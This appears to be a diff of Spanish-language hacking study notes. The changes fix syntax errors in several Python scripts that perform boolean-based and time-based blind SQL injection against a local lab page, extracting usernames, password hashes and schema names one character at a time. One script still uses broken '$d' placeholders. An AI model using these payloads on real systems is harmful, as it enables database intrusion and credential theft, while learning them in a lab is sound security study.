@@ -2330,7 +2330,7 @@ curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 o
 
 curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id=1)=97)" # Nos devuelve codigo de estado 200 porque a:97 = 97:a
 
-# --------------------- *** ARCHIVO PYTHON *** ------------------------
+# --------------------- *** ARCHIVO PYTHON 1 *** ------------------------
 # ----- sqli.py inicio
 #!/usr/bin/env python3
 import requests, signal, sys, time, string
@@ -2358,7 +2358,7 @@ def makeSQLI():
     extracted_info = ""
 
     for position in range(1,50):
-        for character in range(33,126)
+        for character in range(33,126):
             sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)
 
             p1.status(sqli_url)
@@ -2375,7 +2375,7 @@ if __name__ == "__main__":
 # ----- sqli.py fin
 
 
-
+# --------------------- *** ARCHIVO PYTHON 2 *** ------------------------
 # NESTED QUERY Modificamos el archivo de python archivo en python
 # ----- sqli.py inicio
 #!/usr/bin/env python3
@@ -2404,7 +2404,7 @@ def makeSQLI():
     extracted_info = ""
 
     for position in range(1,50):
-        for character in range(33,126)
+        for character in range(33,126):
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
 
             p1.status(sqli_url)
@@ -2421,7 +2421,7 @@ if __name__ == "__main__":
 # ----- sqli.py fin
 
 
-
+# --------------------- *** ARCHIVO PYTHON 3 *** ------------------------
 # NESTED QUERY Modificamos el archivo de python archivo en python
 # ----- sqli.py inicio
 #!/usr/bin/env python3
@@ -2450,7 +2450,7 @@ def makeSQLI():
     extracted_info = ""
 
     for position in range(1,50):
-        for character in range(33,126)
+        for character in range(33,126):
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)
 
             p1.status(sqli_url)
@@ -2467,7 +2467,7 @@ if __name__ == "__main__":
 # ----- sqli.py fin
 
 
-
+# --------------------- *** ARCHIVO PYTHON 4 *** ------------------------
 # NESTED QUERY Modificamos el archivo de python archivo en python
 # ----- sqli.py inicio
 #!/usr/bin/env python3
@@ -2496,7 +2496,7 @@ def makeSQLI():
     extracted_info = ""
 
     for position in range(1,50):
-        for character in range(33,126)
+        for character in range(33,126):
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
 
             p1.status(sqli_url)
@@ -2513,7 +2513,7 @@ if __name__ == "__main__":
 # ----- sqli.py fin
 
 
-
+# --------------------- *** ARCHIVO PYTHON 5 *** ------------------------
 # Vemos inyecciones basadas en tiempo
 # NESTED QUERY Modificamos el archivo de python archivo en python
 # ----- sqli.py inicio
@@ -2543,7 +2543,7 @@ def makeSQLI():
     extracted_info = ""
 
     for position in range(1,50):
-        for character in range(33,126)
+        for character in range(33,126):
             sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), $d,1))=$d,sleep(0.35),1)" % (position, character)
 
             p1.status(sqli_url)
